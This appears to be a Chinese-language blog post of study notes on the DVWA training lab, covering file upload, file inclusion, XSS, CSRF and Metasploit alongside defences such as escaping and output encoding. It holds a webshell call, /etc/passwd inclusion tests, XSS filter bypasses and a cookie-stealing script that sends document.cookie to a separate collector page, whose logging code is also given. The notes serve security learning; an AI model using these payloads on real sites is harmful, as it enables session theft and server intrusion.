<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.对传入的命令严格过滤</span><br><span class="line">EscapeShellCmd()</span><br><span class="line">把字符串可能瞒过Shell而去执行另一个命令的字符转义，比如管道符|重定向&gt;文件读入&lt;</span><br><span class="line">EscapeShellArg()</span><br><span class="line">给定字符串加上单引号，并把字符串的单引号转义，这样字符串就可以安全地作为命令参数</span><br><span class="line">2.在后台对应用权限进行控制（比如给php建立独立得到账号，控制php启动权限）</span><br></pre></td></tr></table></figure>





<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传漏洞、SQL注入、XSS攻击是目前最主流得到Web攻击手法</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_44276741/article/details/115910426</span><br><span class="line">补充备注：</span><br><span class="line">Low		img有大小限制</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/dvwa/1653012847740.png" alt="1653012847740"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在前端限制value大小，可以随便修改</span><br><span class="line">http://192.168.213.135/dvwa/hackable/uploads/cmd.php</span><br><span class="line">执行cmd			注意有分号</span><br><span class="line">http://192.168.213.135/dvwa/hackable/uploads/cmd.php?cmd=system(%22dir%22);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/dvwa/文件上_post.png" alt="文件上_post"><img src="/2023/07/05/dvwa/文件上传_get.png" alt="文件上传_get"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//中国蚁剑只能用post连接</span></span><br><span class="line"><span class="comment">//get从url拿，post从body拿</span></span><br></pre></td></tr></table></figure>

<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">上传文件的MIME类型		大类/小类</span><br><span class="line">html网页.html			text/html</span><br><span class="line">普通文本.txt			text/plain</span><br><span class="line">GIF图像.gif			image/gif</span><br><span class="line">JPEG图像.jpeg.jpg		image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="comment">//由服务器端php源码可知，判断是用content-type这个属性，这个属性是根据上传文件得到，又应为没有在前端加以限制，有2种解法</span></span><br><span class="line"><span class="comment">//上传.php格式文件，抓包改content-type为image/png</span></span><br><span class="line"><span class="comment">//上传.png格式文件，抓包改后缀为.php</span></span><br></pre></td></tr></table></figure>

<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//程序开发人员通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用得到过程称为包含。</span></span><br><span class="line"><span class="comment">//有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞</span></span><br><span class="line"><span class="comment">//可能存在漏洞的页面URL</span></span><br><span class="line"><span class="comment">//	http：//xxx/index.php?page=downloads.php</span></span><br><span class="line"><span class="comment">//	http：//xxx/index.php?page=main.php</span></span><br><span class="line"><span class="comment">//漏洞测试</span></span><br><span class="line"><span class="comment">//	http://xxx/index.php?page=C:\Windows\system.ini</span></span><br><span class="line"><span class="comment">//	http://xxx/index.php?page=/etc/passwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//http://192.168.213.135/dvwa/phpinfo.php查询allow_url_include是否打开，需要打开</span></span><br><span class="line"><span class="comment">//这个在dvwa/php.ini里面有设置，不过和php.ini里现实的不一样</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/dvwa/1653633198694.png" alt="1653633198694"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://192.168.213.135/dvwa/vulnerabilities/fi/?page=/www/admin/localhost_80/wwwroot/dvwa/php.ini</span></span><br><span class="line"><span class="comment">// 	/etc/passwd也是绝对路径不知道为啥不行</span></span><br><span class="line"><span class="comment">//windows</span></span><br><span class="line"><span class="comment">//http://192.168.88.1/dvwa/vulnerabilities/fi/?page=D:\phpStudy\WWW\dvwa\php.ini</span></span><br><span class="line"><span class="comment">//参考资料</span></span><br><span class="line"><span class="comment">//http://t.zoukankan.com/yuzly-p-10799486.html</span></span><br><span class="line"><span class="comment">//https://blog.csdn.net/King0237/article/details/115055549</span></span><br></pre></td></tr></table></figure>

<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require(),找不到被包含的文件时产生致命错误，并停止脚本运行</span><br><span class="line">include(),找不到被包含文件时只会产生警告，脚本将继续运行</span><br><span class="line">include_once()与include()类似，唯一区别时如果该文件中代码已经被包含，则不会再次包含</span><br><span class="line">require_once()与require()类似，唯一区别时如果该文件中的代码已经被包含，则不会再次包含</span><br></pre></td></tr></table></figure>

<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">XSS危害</span><br><span class="line">    盗取用户cookie</span><br><span class="line">    修改网页内容</span><br><span class="line">    网站挂木马</span><br><span class="line">    利用网站重定向</span><br><span class="line">    XSS蠕虫</span><br><span class="line">XSS恶意代码大都使用javascript，要深入研究，需要精通Javascript</span><br><span class="line">用户用浏览器如果版本太新自带防XSS</span><br><span class="line"></span><br><span class="line"><span class="comment">//XSS又叫CSS(Cross Site Script)跨站脚本攻击，指往web页面插入恶意的HTML代码。用户浏览web时，html代码会被运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//向可输入框插入恶意的HTML代码或javascript代码</span></span><br><span class="line">    </span><br><span class="line">攻击语句</span><br><span class="line"><span class="comment">#页面跳转</span></span><br><span class="line">&lt;script&gt;location=<span class="string">&quot;http://www.baidu.com&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="comment">#嵌入网页</span></span><br><span class="line">&lt;iframe src=http:<span class="comment">//www.baidu.com width=400 height=300&gt;&lt;/iframe&gt;</span></span><br><span class="line">&lt;iframe src=http:<span class="comment">//www.baidu.com width=0 height=0 frameborder=0&gt;&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="非持久性–反射型XSS"><a href="#非持久性–反射型XSS" class="headerlink" title="非持久性–反射型XSS"></a>非持久性–反射型XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这种攻击方式无法将恶意代码保存到网站中，而支队当前url生效，因而它需要用户自行去触发，通常出现在网站搜索栏，用户登入口等地方</span><br><span class="line"><span class="comment">//通过GET和POST向服务器输入数据，输入数据一般放在URL或者form数据中，如果服务器对输入数据不过滤，验证和编码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&lt;script&gt;alert(&quot;hyy&quot;)&lt;/script&gt;</span></span><br><span class="line"><span class="comment">//&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="持久性–存储型XSS"><a href="#持久性–存储型XSS" class="headerlink" title="持久性–存储型XSS"></a>持久性–存储型XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接将xss语句插入到网站的正常页面中（通常留言本），用户访问了这些页面，就会自动执行其中的xss语句，靶机：NPMserv中的火线BLOG网页</span><br><span class="line"><span class="comment">//服务器将用户输入的恶意脚本没有通过验证直接存放在数据库，且每次通过调用数据库的方式将数据呈现在浏览器上，该XSS脚本攻击将一直存在。若用户访问该页面，恶意脚本就会触发，用于盗取其他用户的私人信息</span></span><br></pre></td></tr></table></figure>

<h2 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//trim(?)函数用于去除字符串左右两侧的空格</span></span><br><span class="line"><span class="comment">//mysql_real_escape_string(?)转义，xss语句可能存在单引号等字符，但这些字符只是在被存入数据库时被进行了转义，当他们从数据库调出来在浏览器执行时，并不影响其原本功能</span></span><br><span class="line"><span class="comment">//htmlspecialshars(?)把预定义的字符转换为html实体，例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$str</span> = <span class="string">&quot;this is some &lt;b&gt;bold&lt;/b&gt; text&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//stripslashes(?)删除反斜杠</span></span><br><span class="line"><span class="comment">//addslashes()函数返回预定义字符之前添加反斜杠的字符串，预定义字符为单双引号，反斜杠\，NULL</span></span><br><span class="line"><span class="comment">//strip_tags()过滤字符串中的html标签</span></span><br></pre></td></tr></table></figure>

<h2 id="接受cookie的页面代码"><a href="#接受cookie的页面代码" class="headerlink" title="接受cookie的页面代码"></a>接受cookie的页面代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">准备一台安装又PHP环境的Web服务器(e.g.  <span class="number">192.168</span>.<span class="number">88.1</span>)创建一个名为getcookie.php的网页代码如下</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);			<span class="comment">//远程主机地址</span></span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);			<span class="comment">//格式显示时间</span></span><br><span class="line">    <span class="variable">$referer</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>);		<span class="comment">//链接来源</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);			<span class="comment">//打开cookie.txt,若不存在就创建它</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;	IP:&quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;	Date and Time: &quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;	Referer:&quot;</span>.<span class="variable">$referer</span>.<span class="string">&quot;	Cookie:&quot;</span>.<span class="variable">$cookie</span>.<span class="string">&quot;|||&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">如何测试：给这个网页发get请求</span><br><span class="line">    </span><br><span class="line">窃取cookie，write里面时三部分拼接在一起</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.<span class="title function_ invoke__">write</span>(</span><br><span class="line">    	<span class="string">&#x27;&lt;img src=&quot;http://192.168.88.1/getcookie.php?cookie=&#x27;</span> + </span><br><span class="line">    	document.cookie + </span><br><span class="line">    	<span class="string">&#x27;&quot; width=0 height=0 border=0 /&gt;&#x27;</span></span><br><span class="line">	);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">firebug扩展可以改cookie不过已经停止维护了</span><br></pre></td></tr></table></figure>

<h2 id="突破过滤"><a href="#突破过滤" class="headerlink" title="突破过滤"></a>突破过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;script&gt;过滤</span><br><span class="line">用&lt;img&gt;或者双写script</span><br><span class="line">2.alert过滤</span><br><span class="line">用	&lt;script&gt;confirm(&#x27;hi&#x27;)&lt;/script&gt;</span><br><span class="line">	&lt;img src=1 onerror=confirm(&#x27;1&#x27;)&gt;</span><br><span class="line">3.XSS语句输出标签属性中突破</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.对前端输入和输出过滤编码</span></span><br><span class="line">htmlspecialchars、strip_tags</span><br><span class="line"><span class="comment">//2.关键cookie只用host-only</span></span><br></pre></td></tr></table></figure>

<h1 id="Metasploit-系统漏洞"><a href="#Metasploit-系统漏洞" class="headerlink" title="Metasploit(系统漏洞)"></a>Metasploit(系统漏洞)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Metasploit Framework(MSF)集成了各个平台上常见的溢出漏洞和利用代码</span><br><span class="line">sectools排第二</span><br></pre></td></tr></table></figure>

<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果能够成功地对目标计算机进行缓冲区溢出，那么就可以直接获得系统shell</span><br><span class="line">要成功进行缓冲区溢出，前提是目标计算机存在漏洞</span><br><span class="line">微软对Windows系统的漏洞MS08_067		MS表示Windows2008年第67个漏洞</span><br></pre></td></tr></table></figure>

<h2 id="kali上使用"><a href="#kali上使用" class="headerlink" title="kali上使用"></a>kali上使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">具体看https://www.bilibili.com/video/BV1Di4y1u7s6?p=16&amp;vd_source=d5448e640adeda715972607248810967</span><br><span class="line">没看完</span><br><span class="line"></span><br><span class="line">自带,PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS）</span><br><span class="line">service postgresql start		首先打开数据库</span><br><span class="line">msfconsole						打开msf，windows也是这句</span><br><span class="line">包含模块：	一般先使用渗透攻击模块exploit对目标进行渗透，渗透成功后执行攻击荷载模块</span><br><span class="line">exploit		渗透攻击模块，用于实际发起攻击</span><br><span class="line">auxiliary	辅助模块，执行扫描之类的动作</span><br><span class="line">payload		攻击荷载模块，目标被成功渗透后执行的代码，payload中主要内容包括shellcode，一段获取shell的代码</span><br><span class="line"></span><br><span class="line">MS14_064漏洞</span><br><span class="line">远程攻击者可利用此漏洞通过构造的网站执行任意代码</span><br><span class="line">影响Win95+IE3~Win10+IE11全版本</span><br><span class="line">Metasploit中此漏洞的利用模块是exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line">此exploit需要调用powershell，因而支队安装有powershell的系统有效</span><br></pre></td></tr></table></figure>

<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CSRF(Cross-Site Request Forgery)跨站点请求伪造</span><br><span class="line">特点：盗用用户的身份，以用户的名义进行某些非法操作 </span><br></pre></td></tr></table></figure>

<h2 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//medium</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]			<span class="comment">//用户提交的http协议的referer信息来源地址，</span></span><br><span class="line"><span class="comment">//bp可以改referer，有些机构禁用了referer</span></span><br><span class="line"></span><br><span class="line">同级目录下D:\phpStudy\WWW\dvwa\vulnerabilities\fi\index.php</span><br><span class="line">    </span><br><span class="line"><span class="comment">//	medium级别转义删除http:// https://	防止远程文件包含</span></span><br><span class="line"><span class="comment">//	远程包含漏洞前提，php.ini配置如下：</span></span><br><span class="line">    allow_url_fopen=on</span><br><span class="line">    allow_url_include=on</span><br><span class="line">    magic_quotes_gpc=off</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://huyaoyao2019.github.io/2023/07/05/dvwa/" data-id="cljpvmu800000pwez2pdh6qgn" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/java%E5%AE%89%E5%85%A8/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/dvwa/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>